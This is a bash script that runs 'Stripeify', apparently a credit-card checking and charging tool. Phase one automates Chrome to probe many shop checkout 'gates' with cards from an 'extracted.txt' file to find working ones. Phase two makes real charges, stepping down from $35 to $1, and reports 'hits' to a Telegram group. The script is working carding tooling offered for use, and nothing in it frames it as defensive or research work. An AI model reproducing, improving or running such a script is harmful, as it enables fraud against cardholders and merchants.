#!/bin/bash
# Stripeify - Full Production Run Script
# Discovers valid gates, then optionally charges cards

set -e  # Exit on error

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║     Stripeify - Production Card Checker                  ║"
echo "║     Phase 1: Discovery | Phase 2: Charging               ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

# Configuration
GATES_DIR="gates_dir"
CARDS_FILE="extracted.txt"
TELEGRAM_CONFIG="telegram_config.json"
MAX_GATES_PHASE1=100  # Test 100 gates in phase 1
AUTH_ONLY_PHASE1="true"  # Safe mode for phase 1
AUTH_ONLY_PHASE2="false"  # LIVE mode for phase 2 (CHARGES!)

# Verify files exist
if [ ! -d "$GATES_DIR" ]; then
    echo "❌ Error: Gates directory not found: $GATES_DIR"
    exit 1
fi

if [ ! -f "$CARDS_FILE" ]; then
    echo "❌ Error: Cards file not found: $CARDS_FILE"
    exit 1
fi

if [ ! -f "$TELEGRAM_CONFIG" ]; then
    echo "❌ Error: Telegram config not found: $TELEGRAM_CONFIG"
    exit 1
fi

# Count gates and cards
GATE_COUNT=$(find "$GATES_DIR" -name "*.txt" -exec cat {} \; | wc -l)
CARD_COUNT=$(wc -l < "$CARDS_FILE")

echo "📊 Data Summary:"
echo "   - Gates: $GATE_COUNT total"
echo "   - Cards: $CARD_COUNT total"
echo "   - Phase 1 will test: $MAX_GATES_PHASE1 gates"
echo ""

# Phase 1: Discovery (Safe - No Charges)
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📍 PHASE 1: Discovering Valid Gates (Authorization-Only)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "   ✓ Testing $MAX_GATES_PHASE1 gates"
echo "   ✓ Using wrong CVV (999) - NO CHARGES"
echo "   ✓ Finding active gates"
echo "   ✓ Telegram notifications enabled"
echo ""

# Kill existing ChromeDriver
echo "🔧 Stopping any existing ChromeDriver..."
pkill -f chromedriver 2>/dev/null || true
sleep 2

# Start ChromeDriver
echo "🌐 Starting ChromeDriver on port 9515..."
chromedriver --port=9515 > /dev/null 2>&1 &
CHROMEDRIVER_PID=$!
sleep 3

# Verify ChromeDriver started
if ! ps -p $CHROMEDRIVER_PID > /dev/null; then
    echo "❌ Error: ChromeDriver failed to start"
    exit 1
fi

echo "✓ ChromeDriver running (PID: $CHROMEDRIVER_PID)"
echo ""

# Run Phase 1
echo "🔍 Running discovery mode..."
echo "   (This may take 30-60 minutes for 100 gates)"
echo ""

./target/release/shopify_checker discover \
    --gates-dir "$GATES_DIR" \
    --cards-file "$CARDS_FILE" \
    --telegram-config "$TELEGRAM_CONFIG" \
    --auth-only="$AUTH_ONLY_PHASE1" \
    --max-gates "$MAX_GATES_PHASE1" \
    -o phase1_discovery.json

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ Phase 1 Complete!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "📁 Output Files:"
echo "   - valid_gates.json (discovered gates)"
echo "   - phase1_discovery.json (detailed results)"
echo ""

# Check if valid gates were found
if [ ! -f "valid_gates.json" ]; then
    echo "❌ No valid gates found. Exiting."
    kill $CHROMEDRIVER_PID 2>/dev/null || true
    exit 1
fi

# Parse valid gate count
VALID_GATE_COUNT=$(jq '.total_valid' valid_gates.json 2>/dev/null || echo "0")

if [ "$VALID_GATE_COUNT" = "0" ]; then
    echo "❌ No valid gates discovered. Try increasing --max-gates or check gate URLs."
    kill $CHROMEDRIVER_PID 2>/dev/null || true
    exit 1
fi

echo "📊 Discovery Results:"
echo "   - Valid gates found: $VALID_GATE_COUNT"
echo "   - Success rate: $(jq -r '.valid_gates | map(.success_rate) | add / length * 100 | floor' valid_gates.json 2>/dev/null || echo "N/A")%"
echo ""

# Show top 5 gates
echo "🏆 Top 5 Valid Gates:"
jq -r '.valid_gates[:5] | .[] | "   - \(.url) (Success: \(.success_count), Failures: \(.failure_count))"' valid_gates.json 2>/dev/null || echo "   (Unable to parse)"
echo ""

# Ask user before Phase 2
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "⚠️  WARNING: Phase 2 will make REAL CHARGES!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Phase 2 Details:"
echo "   - Uses REAL CVV from cards"
echo "   - Actual money will be charged"
echo "   - Charge amounts: \$35 → \$25 → \$14.99 → \$4.99 → \$2 → \$1"
echo "   - Will process $CARD_COUNT cards"
echo "   - Using $VALID_GATE_COUNT valid gates"
echo ""
echo "⚠️  This cannot be undone!"
echo ""

read -p "Type 'YES' to continue with Phase 2 (charging mode): " CONTINUE

if [ "$CONTINUE" != "YES" ]; then
    echo ""
    echo "❌ Phase 2 cancelled by user"
    echo "   - Valid gates saved in valid_gates.json"
    echo "   - You can run Phase 2 later with:"
    echo "     ./target/release/shopify_checker rotate --gates valid_gates.json --cards-file extracted.txt --telegram-config telegram_config.json --auth-only=false"
    echo ""
    kill $CHROMEDRIVER_PID 2>/dev/null || true
    exit 0
fi

# Phase 2: Charge Cards (LIVE - Makes Charges)
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📍 PHASE 2: Charging Cards on Valid Gates"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "   ⚠️  LIVE MODE - REAL CHARGES"
echo "   - Using $VALID_GATE_COUNT valid gates"
echo "   - Processing $CARD_COUNT cards"
echo "   - Telegram notifications enabled"
echo ""

./target/release/shopify_checker rotate \
    --gates valid_gates.json \
    --cards-file "$CARDS_FILE" \
    --telegram-config "$TELEGRAM_CONFIG" \
    --auth-only="$AUTH_ONLY_PHASE2" \
    -o phase2_charged.json

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ Phase 2 Complete!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "📁 Output Files:"
echo "   - phase2_charged.json (charging results)"
echo "   - Check Telegram for notifications"
echo ""

# Cleanup
echo "🔧 Cleaning up..."
kill $CHROMEDRIVER_PID 2>/dev/null || true

echo ""
echo "🏁 Production run complete!"
echo ""
echo "📊 Next Steps:"
echo "   1. Review phase2_charged.json for results"
echo "   2. Check Telegram group for hits"
echo "   3. Update valid_gates.json with new discoveries"
echo ""
